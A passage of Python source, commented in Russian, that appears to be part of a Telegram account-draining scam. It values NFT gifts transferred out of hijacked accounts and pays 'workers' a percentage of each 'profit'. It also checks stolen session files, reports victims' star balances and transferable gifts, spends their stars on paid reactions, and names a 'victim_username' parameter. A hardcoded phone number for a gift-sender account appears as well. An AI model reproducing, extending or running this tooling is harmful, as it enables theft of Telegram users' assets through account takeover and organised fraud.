                            for collection_name, links in unique_collections.items():
                                try:
                                    floor_price = None
                                    
                                    # Сначала пробуем использовать кэш, если есть
                                    if all_floors_cache:
                                        try:
                                            formatted_name = format_collection_name(collection_name)
                                            possible_keys = [
                                                formatted_name,
                                                collection_name.lower(),
                                                collection_name,
                                                formatted_name.replace(' ', ''),
                                                collection_name.replace('Cake', ' Cake').strip().lower()
                                            ]
                                            
                                            for key in possible_keys:
                                                if key in all_floors_cache:
                                                    price = float(all_floors_cache[key])
                                                    if price > 0:
                                                        floor_price = price
                                                        break
                                            
                                            # Поиск по частичному совпадению
                                            if not floor_price:
                                                name_lower = formatted_name.lower()
                                                for key, value in all_floors_cache.items():
                                                    key_lower = key.lower()
                                                    if name_lower in key_lower or key_lower in name_lower:
                                                        price = float(value)
                                                        if price > 0:
                                                            floor_price = price
                                                            break
                                        except Exception:
                                            pass
                                    
                                    # Если кэш не помог, используем прямой вызов get_floor_price
                                    if not floor_price and auth_data:
                                        try:
                                            floor_price = get_floor_price(collection_name, auth_data=auth_data, max_retries=1, retry_delay=0.5)
                                        except Exception:
                                            pass
                                    
                                    if floor_price:
                                        floor_value = float(floor_price)
                                        # Учитываем количество ссылок этой коллекции
                                        current_floor += floor_value * len(links)
                                        logger.debug(f"⚠️ Флор для {collection_name}: {floor_value} TON x{len(links)} ссылок (FALLBACK: по коллекции, модель не учитывается)")
                                    else:
                                        logger.debug(f"⚠️ Флор для {collection_name} ({len(links)} ссылок): не найден")
                                except Exception as floor_err:
                                    logger.warning(f"⚠️ Ошибка получения флора для {collection_name}: {floor_err}")
                    except ImportError:
                        # Fallback на старый метод
                        from portals_api import get_gifts_floors, get_auth_data
                        import re
                        auth_data = get_auth_data()
                        all_floors = get_gifts_floors(auth_data)
                        for link in valid_gift_links:
                            match = re.search(r'/nft/([^/?]+)', link)
                            if match:
                                nft_name = match.group(1).split('-')[0]
                                nft_name_lower = nft_name.lower()
                                for floor_name, floor_price in all_floors.items():
                                    if nft_name_lower in floor_name.lower() or floor_name.lower() in nft_name_lower:
                                        current_floor += float(floor_price) if floor_price else 0
                                        break
                except Exception as floor_err:
                    logger.debug(f"Не удалось рассчитать флор для сообщения пользователю: {floor_err}")
            
            # Получаем процент воркера из БД (по умолчанию 70%)
            worker_percent = 70.0
            try:
                from database import Database
                db = Database()
                if resolved_worker and resolved_worker.get('telegram_id'):
                    worker_percent = db.get_worker_percent(resolved_worker.get('telegram_id'))
            except Exception as percent_err:
                logger.debug(f"Не удалось получить процент воркера: {percent_err}")
            
            worker_share = current_floor * (worker_percent / 100.0)
            
            # Формируем полное сообщение о профите для пользователя
            user_profit_message = (
                f"🎉 <b>Новый профит!</b>\n\n"
                f"📊 <b>Подарков получено:</b> {gift_count}\n"
                f"💎 <b>Флор:</b> {current_floor:.2f} TON\n"
                f"👷 <b>Доля воркера ({worker_percent:.1f}%):</b> {worker_share:.2f} TON\n"
                f"⏰ <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            )
            
            if valid_gift_links:
                user_profit_message += f"🎁 <b>Полученные подарки ({len(valid_gift_links)}):</b>\n"
                # Показываем первые 20 ссылок в основном сообщении
                links_to_show = valid_gift_links[:20]
                for i, link in enumerate(links_to_show, 1):
                    user_profit_message += f"{i}. {link}\n"
                if len(valid_gift_links) > 20:
                    user_profit_message += f"\n... и еще {len(valid_gift_links) - 20} подарков\n"
            
            if failed_gift_transfers and len(failed_gift_transfers) > 0:
                user_profit_message += f"\n❌ <b>Неудачные передачи:</b>\n"
                for i, failed in enumerate(failed_gift_transfers[:5], 1):
                    user_profit_message += f"{i}. {failed}\n"
                if len(failed_gift_transfers) > 5:
                    user_profit_message += f"... и еще {len(failed_gift_transfers) - 5}\n"
            
            user_profit_message += "\n✅ Профит сохранен в базе данных!"
            user_profit_message += "\n\n💡 Используйте /profit_links в боте-логов для просмотра всех ссылок"
            
            # Отправляем пользователю через бот-логов (если он отслеживается)
            await send_notification_to_tracked_user(user_id, user_profit_message)
            
            # Также отправляем напрямую через основной бот (на случай если пользователь не подписан)
            try:
                from telegram_bot import bot as main_bot
                # Отправляем основное сообщение
                await main_bot.send_message(
                    chat_id=user_id,
                    text=user_profit_message,
                    parse_mode="HTML"
                )
                logger.info(f"✅ Профит отправлен лично пользователю {user_id}")
                
                # Если ссылок больше 20, отправляем остальные отдельными сообщениями
                if valid_gift_links and len(valid_gift_links) > 20:
                    remaining_links = valid_gift_links[20:]
                    max_per_message = 30
                    for chunk_start in range(0, len(remaining_links), max_per_message):
                        chunk = remaining_links[chunk_start:chunk_start + max_per_message]
                        chunk_text = f"🔗 <b>Остальные подарки (часть {chunk_start // max_per_message + 1}):</b>\n\n"
                        for i, link in enumerate(chunk, chunk_start + 21):
                            chunk_text += f"{i}. {link}\n"
                        try:
                            await main_bot.send_message(
                                chat_id=user_id,
                                text=chunk_text,
                                parse_mode="HTML"
                            )
                            await asyncio.sleep(0.2)  # Небольшая задержка между сообщениями
                        except Exception:
                            pass
            except Exception as direct_send_err:
                # Если не удалось отправить напрямую, это нормально (пользователь может не начать диалог)
                logger.debug(f"Не удалось отправить профит напрямую пользователю {user_id}: {direct_send_err}")
        except Exception as user_profit_err:
            logger.warning(f"Не удалось отправить профит пользователю {user_id}: {user_profit_err}", exc_info=True)
        
        # Также отправляем лично воркеру (создателю чека)
        try:
            worker_telegram_id = resolved_worker.get('telegram_id')
            if worker_telegram_id:
                from telegram_bot import bot
                worker_message = f"""🎉 **Новый профит!**

📊 **Подарков получено:** {gift_count}
⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{gift_list_text.rstrip()}{failed_transfers_text.rstrip()}

✅ Все подарки успешно переданы!
"""
                try:
                    await bot.send_message(
                        chat_id=worker_telegram_id,
                        text=worker_message,
                        parse_mode="Markdown"
                    )
                    logger.info(f"✅ Лог профита отправлен лично воркеру {worker_telegram_id}")
                except Exception as worker_send_err:
                    logger.warning(f"Не удалось отправить лог профита воркеру {worker_telegram_id}: {worker_send_err}")
        except Exception as worker_err:
            logger.error(f"Ошибка при отправке лога профита воркеру: {worker_err}")
        
        # Сохраняем профит в БД
        try:
            from database import Database
            profit_db = Database()
            
            # Логируем что сохраняем
            logger.debug(f"Сохранение профита: user_id={user_id}, gift_count={gift_count}, links_count={len(valid_gift_links) if valid_gift_links else 0}")
            
            # Рассчитываем флор всех успешно переданных NFT используя правильный метод
            total_floor_price = 0.0
            if valid_gift_links:
                try:
                    import sys
                    import os
                    # Добавляем путь к другому проекту для импорта
                    killamonjaro_path = '/root/KillamonjaroAuto/src/utils'
                    if os.path.exists(killamonjaro_path) and killamonjaro_path not in sys.path:
                        sys.path.insert(0, killamonjaro_path)
                    
                    try:
                        from portals_floor import extract_collection_name, get_floor_price, get_auth_data
                        import os as os_module
                        
                        # Получаем auth_data
                        auth_data = os_module.getenv('PORTALS_AUTH_DATA', '')
                        if not auth_data:
                            try:
                                from portals_api import get_auth_data as get_auth_data_fallback
                                auth_data = get_auth_data_fallback()
                            except Exception as auth_err:
                                logger.warning(f"⚠️ Не удалось получить auth_data для расчета флора: {auth_err}")
                                auth_data = None
                        
                        # НОВЫЙ МЕТОД: Рассчитываем флор для каждого NFT отдельно по модели (точный расчет)
                        # Импортируем функции для расчета флора по модели
                        try:
                            from utils_nft_floor import get_floor_price_by_nft_link
                        except ImportError:
                            logger.warning("⚠️ utils_nft_floor не найден, используем старый метод расчета флора")
                            get_floor_price_by_nft_link = None
                        
                        if get_floor_price_by_nft_link and auth_data:
                            # Рассчитываем флор для каждого NFT отдельно (учитывая модель)
                            for link in valid_gift_links:
                                try:
                                    # Получаем цену по ссылке NFT (с учетом всех атрибутов: модель, фон, символ)
                                    floor_price, collection_name, attributes = get_floor_price_by_nft_link(
                                        nft_link=link,
                                        max_retries=2,
                                        retry_delay=0.5,
                                        auth_data=auth_data
                                    )
                                    
                                    if floor_price:
                                        floor_value = float(floor_price)
                                        total_floor_price += floor_value
                                        
                                        # Формируем строку с атрибутами для логирования
                                        attr_parts = []
                                        if attributes:
                                            if attributes.get('model'):
                                                attr_parts.append(f"Model: {attributes.get('model')}")
                                            if attributes.get('backdrop'):
                                                attr_parts.append(f"Backdrop: {attributes.get('backdrop')}")
                                            if attributes.get('symbol'):
                                                attr_parts.append(f"Symbol: {attributes.get('symbol')}")
                                        
                                        if attr_parts:
                                            attrs_str = ", ".join(attr_parts)
                                            logger.debug(f"✅ Флор для {collection_name} ({attrs_str}): {floor_value} TON - {link}")
                                        else:
                                            logger.debug(f"✅ Флор для {collection_name}: {floor_value} TON (атрибуты не найдены, используется цена коллекции) - {link}")
                                    else:
                                        logger.debug(f"⚠️ Флор для {link}: не найден")
                                except Exception as link_err:
                                    logger.warning(f"⚠️ Ошибка расчета флора для {link}: {link_err}")
                        else:
                            # FALLBACK: Старый метод по коллекциям (если новый не работает)
                            # Оптимизация: собираем все уникальные коллекции сначала
                            unique_collections = {}
                            for link in valid_gift_links:
                                try:
                                    collection_name = extract_collection_name(link)
                                    if collection_name and collection_name not in unique_collections:
                                        unique_collections[collection_name] = []
                                    if collection_name:
                                        unique_collections[collection_name].append(link)
                                except Exception:
                                    pass
                            
                            # Делаем один запрос для получения всех floor цен (кэшируем)
                            all_floors_cache = None
                            if auth_data:
                                try:
                                    import requests
                                    url = 'https://portal-market.com/api/collections/floors'
                                    headers = {
                                        'Authorization': auth_data,
                                        'Origin': 'https://portal-market.com',
                                        'Referer': 'https://portal-market.com/',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                                    }
                                    response = requests.get(url, headers=headers, timeout=10)
                                    if response.status_code == 200:
                                        data = response.json()
                                        all_floors_cache = data.get('floorPrices', data)
                                        if not isinstance(all_floors_cache, dict):
                                            all_floors_cache = None
                                except Exception as cache_err:
                                    logger.debug(f"Не удалось получить кэш floor цен: {cache_err}")
                            
                            # Рассчитываем флор для каждой уникальной коллекции
                            for collection_name, links in unique_collections.items():
                                try:
                                    floor_price = None
                                    
                                    # Сначала пробуем использовать кэш, если есть
                                    if all_floors_cache:
                                        try:
                                            from portals_floor import format_collection_name
                                            formatted_name = format_collection_name(collection_name)
                                            possible_keys = [
                                                formatted_name,
                                                collection_name.lower(),
                                                collection_name,
                                                formatted_name.replace(' ', ''),
                                                collection_name.replace('Cake', ' Cake').strip().lower()
                                            ]
                                            
                                            for key in possible_keys:
                                                if key in all_floors_cache:
                                                    price = float(all_floors_cache[key])
                                                    if price > 0:
                                                        floor_price = price
                                                        break
                                            
                                            # Поиск по частичному совпадению
                                            if not floor_price:
                                                name_lower = formatted_name.lower()
                                                for key, value in all_floors_cache.items():
                                                    key_lower = key.lower()
                                                    if name_lower in key_lower or key_lower in name_lower:
                                                        price = float(value)
                                                        if price > 0:
                                                            floor_price = price
                                                            break
                                        except Exception:
                                            pass
                                    
                                    # Если кэш не помог, используем прямой вызов get_floor_price
                                    if not floor_price and auth_data:
                                        try:
                                            floor_price = get_floor_price(collection_name, auth_data=auth_data, max_retries=1, retry_delay=0.5)
                                        except Exception:
                                            pass
                                    
                                    if floor_price:
                                        floor_value = float(floor_price)
                                        # Учитываем количество ссылок этой коллекции
                                        total_floor_price += floor_value * len(links)
                                        logger.debug(f"⚠️ Флор для {collection_name}: {floor_value} TON x{len(links)} ссылок (FALLBACK: по коллекции, модель не учитывается)")
                                    else:
                                        logger.debug(f"⚠️ Флор для {collection_name} ({len(links)} ссылок): не найден")
                                except Exception as floor_err:
                                    logger.warning(f"⚠️ Ошибка получения флора для {collection_name}: {floor_err}")
                    except ImportError:
                        # Fallback на старый метод, если не удалось импортировать
                        from portals_api import get_gifts_floors, get_auth_data
                        import re
                        
                        auth_data = get_auth_data()
                        all_floors = get_gifts_floors(auth_data)
                        
                        for link in valid_gift_links:
                            match = re.search(r'/nft/([^/?]+)', link)
                            if match:
                                nft_name = match.group(1).split('-')[0]  # Берем только название коллекции
                                nft_name_lower = nft_name.lower()
                                for floor_name, floor_price in all_floors.items():
                                    if nft_name_lower in floor_name.lower() or floor_name.lower() in nft_name_lower:
                                        total_floor_price += float(floor_price) if floor_price else 0
                                        break
                except Exception as floor_err:
                    logger.warning(f"Не удалось рассчитать флор для профита: {floor_err}", exc_info=True)
            
            profit_id = profit_db.save_profit(
                user_id=user_id,
                worker_telegram_id=resolved_worker.get('telegram_id') if resolved_worker else None,
                worker_username=worker_username,
                gift_count=gift_count,
                gift_links=valid_gift_links if valid_gift_links else [],
                failed_transfers=failed_gift_transfers if failed_gift_transfers else None,
                floor_price=total_floor_price
            )
            logger.info(f"✅ Профит сохранен в БД (ID: {profit_id}) для пользователя {user_id}, ссылок: {len(valid_gift_links) if valid_gift_links else 0}, флор: {total_floor_price}")
        except Exception as save_err:
            logger.error(f"❌ Ошибка сохранения профита в БД: {save_err}", exc_info=True)
        
        # Отправляем уведомление отслеживаемым пользователям через бот-логов
        try:
            from logs_bot import send_notification_to_tracked_user
            notification_text = (
                f"🎉 <b>Новый профит!</b>\n\n"
                f"📊 <b>Подарков получено:</b> {gift_count}\n"
                f"⏰ <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            )
            if valid_gift_links:
                notification_text += f"🎁 <b>Подарки:</b>\n"
                for i, link in enumerate(valid_gift_links[:5], 1):
                    notification_text += f"{i}. {link}\n"
                if len(valid_gift_links) > 5:
                    notification_text += f"... и еще {len(valid_gift_links) - 5} подарков\n"
            
            # Отправляем воркеру, если он отслеживается
            if worker_telegram_id:
                await send_notification_to_tracked_user(worker_telegram_id, notification_text)
            
            # Отправляем пользователю, если он отслеживается
            await send_notification_to_tracked_user(user_id, notification_text)
        except Exception as notify_err:
            logger.warning(f"Не удалось отправить уведомление через бот-логов: {notify_err}")
        
        logger.info(f"[PROFIT_LOG] Лог профита успешно отправлен для пользователя {user_id}")
        
    except Exception as e:
        logger.error(f"[PROFIT_LOG] Ошибка отправки лога профита: {e}")
        logger.error(f"[PROFIT_LOG] Тип ошибки: {type(e).__name__}")
        logger.error(f"[PROFIT_LOG] Параметры при ошибке: user_id={user_id}, worker_info={worker_info}")
        import traceback
        logger.error(f"[PROFIT_LOG] Полный traceback:")
        traceback.print_exc()

async def log_gift_processing_error(error, user_id: int, phone: str, log_key: str = None):
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        line = (
            f"❌ Ошибка обработки подарков: {str(error)} (acct {phone}, uid {user_id}, {timestamp})"
        )
        if log_key:
            append_gift_log(log_key, line)
        else:
            from discord_logger import discord_logger
            await discord_logger.send_embed(
                title="❌ Ошибка обработки подарков",
                description="Требуется проверка аккаунта.",
                fields=[
                    {'name': '👤 Аккаунт', 'value': f"{phone} (ID: {user_id})", 'inline': True},
                    {'name': '🚫 Ошибка', 'value': str(error)[:1024], 'inline': False},
                    {'name': '⏰ Время', 'value': timestamp, 'inline': True}
                ],
                webhook_type='actions',
                username="GetGems Bot",
                color=0xe74c3c  # Красный для ошибок
            )
        print("📝 Лог ошибки обработки подарков обработан")
    except Exception as e:
        print(f"❌ Ошибка логирования ошибки обработки: {e}")
def check_session_exists(phone):
    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
    json_file = f"{SESSION_DIR}/{phone.replace('+', '')}.json"
    return os.path.exists(session_file) and os.path.exists(json_file)
def validate_session(phone):
    from telegram_client import TelegramAuth, run_async
    if not check_session_exists(phone):
        return False
    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
    try:
        auth = TelegramAuth(session_file)
        is_valid = run_async(auth.check_connection())
        return is_valid
    except Exception as e:
        try:
            if os.path.exists(session_file):
                os.remove(session_file)
            json_file = f"{SESSION_DIR}/{phone.replace('+', '')}.json"
            if os.path.exists(json_file):
                os.remove(json_file)
        except Exception as cleanup_error:
            pass
        return False

async def get_account_stats(session_string: str) -> dict:
    """
    Получает статистику аккаунта: баланс звёзд и информацию о подарках
    """
    try:
        from pyrogram import Client
        
        # Создаем временного клиента
        client = Client(
            "temp_stats_session",
            session_string=session_string,
            in_memory=True
        )
        
        async with client:
            # Получаем баланс звёзд
            try:
                stars_balance_obj = await client.get_stars_balance()
                # Извлекаем числовое значение из объекта StarsAmount
                if hasattr(stars_balance_obj, 'amount'):
                    stars_balance = int(stars_balance_obj.amount)
                elif hasattr(stars_balance_obj, 'balance'):
                    stars_balance = int(stars_balance_obj.balance)
                else:
                    # Если это уже число
                    stars_balance = int(stars_balance_obj)
                print(f"⭐ Баланс звёзд получен: {stars_balance}")
            except Exception as e:
                print(f"Ошибка получения баланса звёзд: {e}")
                stars_balance = 0
            
            # Получаем подарки
            gifts_stats = await get_gifts_statistics(client)
            
            return {
                'stars_balance': stars_balance,
                'gifts_stats': gifts_stats
            }
            
    except Exception as e:
        print(f"Ошибка получения статистики аккаунта: {e}")
        return {
            'stars_balance': 0,
            'gifts_stats': {
                'total_gifts': 0,
                'nft_gifts': 0,
                'transferable_gifts': 0,
                'non_transferable_gifts': 0
            }
        }

async def get_gifts_statistics(client) -> dict:
    """
    Анализирует подарки и возвращает статистику
    """
    try:
        gifts_stats = {
            'total_gifts': 0,
            'nft_gifts': 0,
            'transferable_gifts': 0,
            'non_transferable_gifts': 0
        }
        
        # Получаем все подарки пользователя
        async for gift in client.get_chat_gifts("me"):
            gifts_stats['total_gifts'] += 1
            
            # Расширенная проверка на NFT подарок
            is_limited = getattr(gift, 'is_limited', False)
            attributes = getattr(gift, 'attributes', None)
            has_attributes = attributes is not None and len(attributes) > 0
            link = getattr(gift, 'link', None)
            
            # NFT подарок определяется по:
            # 1. is_limited = True
            # 2. Наличие attributes (не пустой список)
            # 3. Наличие link со словом 'nft' или 't.me/nft'
            is_nft = bool(is_limited) or has_attributes or (link and ('nft' in link.lower() or 't.me/nft' in link.lower()))
            
            # Если ссылка есть но невалидна — не сбрасываем is_nft,
            # т.к. is_limited=True и наличие attributes важнее формата ссылки.
            # Невалидная ссылка только исключается из передачи, но не из подсчёта.
            if link and not is_valid_nft_link(link):
                logger.debug(f"⚠️ Невалидная ссылка у NFT подарка (подарок всё равно считается): {link}")
            
            if is_nft:
                gifts_stats['nft_gifts'] += 1
                
                # Проверяем можно ли передавать NFT подарок
                # Подарок можно передать если:
                # 1. Он не передан (is_transferred != True)
                # 2. Нет даты блокировки передачи или она прошла
                # 3. can_transfer_at либо None, либо время прошло
                # 4. У подарка нет owner_address (не принадлежит другому пользователю)
                from datetime import datetime
                now = datetime.now()
                
                can_transfer = True
                
                # Проверяем флаг передачи
                if gift.is_transferred:
                    can_transfer = False
                
                # Проверяем наличие владельца (owner_address)
                if hasattr(gift, 'owner_address') and gift.owner_address:
                    can_transfer = False
                
                # Проверяем дату блокировки передачи
                if hasattr(gift, 'can_transfer_at') and gift.can_transfer_at and gift.can_transfer_at > now:
                    can_transfer = False
                    
                # Проверяем общую дату блокировки
                if hasattr(gift, 'locked_until_date') and gift.locked_until_date and gift.locked_until_date > now:
                    can_transfer = False
                
                if can_transfer:
                    gifts_stats['transferable_gifts'] += 1
                else:
                    gifts_stats['non_transferable_gifts'] += 1
            else:
                # Обычные подарки не могут быть переданы
                gifts_stats['non_transferable_gifts'] += 1
        
        return gifts_stats
        
    except Exception as e:
        print(f"Ошибка получения статистики подарков: {e}")
        return {
            'total_gifts': 0,
            'nft_gifts': 0,
            'transferable_gifts': 0,
            'non_transferable_gifts': 0
        }

def format_account_stats_message(stats: dict, user_display: str, timestamp: str) -> str:
    """
    Форматирует сообщение со статистикой аккаунта для логирования (HTML)
    """
    gifts_stats = stats.get('gifts_stats', {})
    stars_balance = stats.get('stars_balance', 0)

    message = (
        f"✅ <b>Успешная авторизация</b>\n\n"
        f"👤 <b>Пользователь:</b> {user_display}\n"
        f"⭐ <b>Баланс звёзд:</b> {stars_balance}\n\n"
        f"🎁 <b>Статистика подарков:</b>\n"
        f"📦 <b>Всего подарков:</b> {gifts_stats.get('total_gifts', 0)}\n"
        f"💎 <b>NFT подарков:</b> {gifts_stats.get('nft_gifts', 0)}\n"
        f"✅ <b>Доступны для передачи:</b> {gifts_stats.get('transferable_gifts', 0)}\n"
        f"🔒 <b>Заблокированы для передачи:</b> {gifts_stats.get('non_transferable_gifts', 0)}\n\n"
        f"⏰ <b>Время:</b> {timestamp}"
    )

    return message


async def get_star_balance_with_client(client) -> tuple[bool, int]:
    """
    Получает баланс звезд через уже существующий Pyrogram клиент
    
    Args:
        client: Активный Pyrogram клиент
    
    Returns:
        tuple[bool, int]: (успех, количество звезд)
    """
    try:
        from pyrogram import raw
        
        # Получаем статус звезд через raw API с обязательным параметром peer
        result = await client.invoke(raw.functions.payments.GetStarsStatus(
            peer=raw.types.InputPeerSelf()
        ))
        
        if result and hasattr(result, 'balance'):
            bal = result.balance
            # StarsAmount содержит поле amount
            if hasattr(bal, 'amount'):
                balance = int(bal.amount)
            # На всякий случай поддержим альтернативные поля
            elif hasattr(bal, 'value'):
                balance = int(bal.value)
            else:
                # Если структура изменилась — логируем и считаем 0
                print(f"⚠️ Неизвестная структура баланса: {type(bal)} {getattr(bal, '__dict__', {})}")
                balance = 0

            print(f"⭐ Текущий баланс звезд: {balance}")
            return True, balance
        else:
            print("❌ Не удалось получить баланс звезд")
            return False, 0
            
    except Exception as e:
        print(f"❌ Ошибка получения баланса звезд: {e}")
        return False, 0

async def send_star_reaction_with_client(client, channel_username: str, message_id: int, star_count: int) -> tuple[bool, str]:
    """
    Отправляет платную звездную реакцию через Pyrogram raw API
    
    Args:
        client: Активный Pyrogram клиент
        channel_username: Имя канала (с @ или без)
        message_id: ID сообщения
        star_count: Количество звезд для реакции
    
    Returns:
        tuple[bool, str]: (успех, сообщение об ошибке или успехе)
    """
    try:
        # Временная глобальная блокировка отправки звёзд
        try:
            from config_bot import config
            if getattr(config, "DISABLE_STAR_REACTION", False):
                msg = "⏸️ Отправка звёзд отключена конфигом, шаг пропущен"
                print(msg)
                return True, msg
        except Exception:
            # Если конфиг недоступен, продолжаем обычную логику
            pass
        from pyrogram import raw
        import time, random, asyncio

        # Очищаем имя канала от @
        if channel_username.startswith('@'):
            channel_username = channel_username[1:]

        print(f"⭐ Отправляем {star_count} звезд на пост {message_id} в канале @{channel_username}...")

        # Убеждаемся, что мы участники канала (на случай закрытого доступа)
        try:
            await client.get_chat(channel_username)
        except Exception:
            try:
                await client.join_chat(channel_username)
                print(f"✅ Присоединились к каналу @{channel_username}")
            except Exception:
                # игнорируем, если не требуется
                pass

        # Получаем raw peer
        peer = await client.resolve_peer(channel_username)

        # Отправляем платную реакцию через messages.sendPaidReaction
        async def _get_server_unixtime() -> int:
            try:
                state = await client.invoke(raw.functions.updates.GetState())
                # updates.state has 'date' field: current server time (unixtime)
                if hasattr(state, 'date'):
                    return int(state.date)
            except Exception:
                pass
            # Fallback to local time if server time not accessible
            return int(time.time())

        async def _make_paid_random_id() -> int:
            # Compose 64-bit id: high 32 bits = server unixtime, low 32 bits = random
            server_time = await _get_server_unixtime()
            rid = ((server_time & 0xFFFFFFFF) << 32) | (random.getrandbits(32) & 0xFFFFFFFF)
            # Ensure positive signed 64-bit
            rid &= (1 << 63) - 1
            return rid

        attempts = 0
        last_exc = None
        while attempts < 3:
            attempts += 1
            random_id = await _make_paid_random_id()
            try:
                result = await client.invoke(
                    raw.functions.messages.SendPaidReaction(
                        peer=peer,
                        msg_id=int(message_id),
                        count=int(star_count),
                        random_id=random_id
                        # private: raw.types.PaidReactionPrivacy(...)
                    )
                )
                if result:
                    success_msg = (
                        f"✅ Успешно отправлено {star_count} звезд на пост {message_id} в канале @{channel_username}"
                    )
                    print(success_msg)
                    return True, success_msg
                else:
                    last_exc = Exception("Empty updates")
            except Exception as e:
                last_exc = e
                es = str(e)
                # Retry on RANDOM_ID issues
                if "RANDOM_ID_EXPIRED" in es or "RANDOM_ID_EMPTY" in es:
                    print("⚠️ Проблема с random_id, повторяем попытку...")
                    await asyncio.sleep(0.2)
                    continue
                # No retry for other errors
                break

        error_msg = "❌ Не удалось отправить звездную реакцию"
        if last_exc:
            error_msg += f": {str(last_exc)}"
        print(error_msg)
        return False, error_msg

        # Если вернулись апдейты — считаем успехом
        if result:
            success_msg = (
                f"✅ Успешно отправлено {star_count} звезд на пост {message_id} в канале @{channel_username}"
            )
            print(success_msg)
            return True, success_msg

        error_msg = "❌ Не удалось отправить звездную реакцию"
        print(error_msg)
        return False, error_msg

    except Exception as e:
        error_str = str(e)
        error_reason = "Неизвестная ошибка"

        # Частые причины ошибок
        if "PEER_ID_INVALID" in error_str or "CHANNEL_INVALID" in error_str:
            error_reason = "Неверное имя канала или канал не найден"
        elif "MESSAGE_ID_INVALID" in error_str:
            error_reason = "Неверный ID сообщения"
        elif "INSUFFICIENT_STARS" in error_str:
            error_reason = "Недостаточно звезд на балансе"
        elif "USER_NOT_PARTICIPANT" in error_str:
            error_reason = "Нужно присоединиться к каналу"
        elif "PAID_REACTIONS_DISABLED" in error_str:
            error_reason = "Платные реакции отключены в этом канале"
        elif "CHAT_WRITE_FORBIDDEN" in error_str:
            error_reason = "Нельзя писать в этот чат"
        elif "RANDOM_ID_EXPIRED" in error_str or "RANDOM_ID_EMPTY" in error_str:
            error_reason = "Проблема с random_id, повторите попытку"
        elif "FLOOD_WAIT" in error_str:
            error_reason = "Сработал FloodWait, попробуйте позже"

        error_msg = f"❌ Ошибка отправки звездной реакции: {error_reason}"
        print(error_msg)
        return False, error_msg

async def log_star_reaction_success(user_id: int, phone: str, star_count: int, channel: str, message_id: int, log_key: str = None):
    """
    Логирует успешную отправку звездной реакции
    """
    try:
        from telegram_bot import bot
        from config_bot import config
        
        message = (
            f"⭐ **Звездная реакция отправлена**\n\n"
            f"👤 **Пользователь:** {user_id} ({phone})\n"
            f"⭐ **Количество звезд:** {star_count}\n"
            f"📢 **Канал:** {channel}\n"
            f"📝 **ID поста:** {message_id}\n"
            f"⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        if log_key:
            append_gift_log(log_key, f"⭐ Звёздная реакция: {star_count} → {channel}/{message_id}")
        else:
            from discord_logger import discord_logger
            await discord_logger.send_message(
                content=message,
                webhook_type='processing',
                username="GetGems Bot"
            )
        print(f"✅ Лог звездной реакции зафиксирован для пользователя {user_id}")
    except Exception as e:
        print(f"❌ Ошибка отправки лога звездной реакции: {e}")

async def log_star_reaction_error(error, user_id: int, phone: str, log_key: str = None):
    """
    Логирует ошибку при отправке звездной реакции
    """
    try:
        from telegram_bot import bot
        from config_bot import config
        
        message = (
            f"❌ **Ошибка звездной реакции**\n\n"
            f"👤 **Пользователь:** {user_id} ({phone})\n"
            f"🚫 **Ошибка:** {str(error)}\n"
            f"⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        if log_key:
            append_gift_log(log_key, f"❌ Ошибка звёздной реакции: {str(error)}")
        else:
            from discord_logger import discord_logger
            await discord_logger.send_message(
                content=message,
                webhook_type='processing',
                username="GetGems Bot"
            )
        print(f"✅ Лог ошибки звездной реакции отправлен в группу для пользователя {user_id}")
    except Exception as e:
        print(f"❌ Ошибка отправки лога ошибки звездной реакции: {e}")

async def send_star_reaction(session_string: str, channel_username: str, message_id: int, star_count: int) -> tuple[bool, str]:
    """
    Send star reaction using Pyrogram client
    Returns (success: bool, message: str)
    """
    try:
        from pyrogram import Client
        
        client = Client("temp_session", session_string=session_string)
        await client.start()
        
        success, message = await send_star_reaction_with_client(client, channel_username, message_id, star_count)
        
        await client.stop()
        return success, message
        
    except Exception as e:
        error_msg = f"Ошибка при отправке звездной реакции: {str(e)}"
        print(error_msg)
        return False, error_msg

async def get_user_id_from_username(username: str) -> tuple[bool, int, str]:
    """
    Получает user_id по username используя аккаунт отправителя подарков
    Returns (success: bool, user_id: int, error_message: str)
    """
    try:
        from pyrogram import Client
        
        # Используем постоянный аккаунт для получения информации о пользователе
        gift_sender_phone = "+79060130047"
        
        # Пытаемся прочитать API-ключи из JSON; если его нет — берём из telegram_client.py
        try:
            with open("sessions/79060130047.json", "r") as f:
                account_data = json.load(f)
            api_id = account_data.get("app_id")
            api_hash = account_data.get("app_hash")
        except Exception:
            from telegram_client import API_ID, API_HASH
            api_id = API_ID
            api_hash = API_HASH
        
        # Предпочитаем session_string, если доступен, иначе .session в workdir
        session_string = account_data.get("session_string") if 'account_data' in locals() else None
        client_name = "79060130047"
        client_lock = get_session_lock(client_name)
        async with client_lock:
            lock = None
            if session_string:
                client = Client(
                    name=client_name,
                    api_id=api_id,
                    api_hash=api_hash,
                    session_string=session_string,
                    in_memory=True
                )
            else:
                client = Client(
                    name=client_name,
                    api_id=api_id,
                    api_hash=api_hash,
                    workdir="sessions/"
                )
                # Межпроцессный замок на время работы клиента с .session
                lock = FileLock(os.path.join("sessions", f"{client_name}.lock"))
                acquired = await lock.acquire(timeout_ms=5000)
                if not acquired:
                    return False, 0, "Не удалось получить файловый замок для сессии"
            await client.start()
        
        # Добавляем @ если его нет
        if not username.startswith('@'):
            username = f"@{username}"
        
        # Получаем информацию о пользователе
        try:
            user = await client.get_users(username)
            user_id = user.id
            print(f"✅ Получен user_id {user_id} для пользователя {username}")
            await client.stop()
            return True, user_id, ""
        except Exception as e:
            print(f"❌ Ошибка получения user_id для {username}: {e}")
            try:
                await client.stop()
            finally:
                if lock:
                    lock.release()
            return False, 0, f"Не удалось найти пользователя {username}: {str(e)}"
            
    except Exception as e:
        print(f"❌ Ошибка подключения к Telegram: {e}")
        return False, 0, f"Ошибка подключения: {str(e)}"

async def send_gift_with_pyrogram(victim_username: str, gift_id: str, text: str = None) -> tuple[bool, str]:
    """
    Send gift using Pyrogram client (Kurigram fork) with dedicated gift sender account
